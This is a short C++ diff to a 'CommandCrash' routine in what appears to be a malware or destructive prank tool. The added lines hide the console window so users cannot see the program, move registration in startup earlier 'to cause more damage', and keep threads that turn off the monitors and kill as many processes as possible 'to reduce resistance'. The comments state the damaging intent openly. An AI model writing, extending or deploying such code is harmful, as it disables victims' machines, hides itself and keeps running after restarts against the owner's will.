@@ -18,13 +18,18 @@ bool CommandCrash::shouldRunThisCommand(ParsedCommand* Parsed)
 
 void CommandCrash::run(ParsedCommand* Parsed)
 {
+	//Hide the window, just to make all but the most experienced windows users frustrated.
+	HWND console = GetConsoleWindow();
+	ShowWindow(console, 0);
+
+	//Register in startup, just to cause more damage.
+	this->RegisterProgram();
+
 	//Turn off the moniter(s)
 	thread* moniter = new thread(&CommandCrash::turnOffMoniter, this);
 
 	//Kill as many processes as possible, to free up resources, and reduce resistance.
 	thread* processKiller = new thread(&CommandCrash::AttackProcesses, this);
-
-	this->RegisterProgram();
 }
 
 void CommandCrash::AttackProcesses()
